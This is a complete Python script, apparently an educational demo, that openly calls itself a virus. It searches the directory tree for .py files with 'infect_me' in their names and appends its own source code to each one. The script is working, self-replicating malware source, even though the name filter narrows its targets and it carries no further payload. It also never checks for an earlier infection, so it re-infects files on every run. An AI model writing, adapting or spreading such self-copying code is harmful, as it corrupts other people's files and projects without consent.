#!/usr/bin/python
import os
import datetime
import subprocess
SIGNATURE = "It's a virus!"

def search(path):
    files_to_infect = []
    file_list = os.listdir(path)
    for filename in file_list:
        if os.path.isdir(path + "/" + filename):
            files_to_infect.extend(search(path + "/" + filename))
                # Only infect python files with
                # "infect_me" in the filename
        elif "infect_me" in filename and filename[-3:] == ".py":
            files_to_infect.append(path+"/"+filename)

    return files_to_infect

def infect(files_to_infect):
    virus = open(os.path.abspath(__file__))
    virus_string = ""
    for i,line in enumerate(virus):
        virus_string += line
    virus.close()
    # Copy file contents and attach worm to end of file
    for filename in files_to_infect:
        f = open(filename)
        temp = f.read()
        f.close()
        f = open(filename,"w")
        f.write(temp + "\n" + virus_string)
        print(filename[len(os.path.abspath("")) + 1:] + " infected.")
        f.close()

files_to_infect = search(os.path.abspath(""))
infect(files_to_infect)
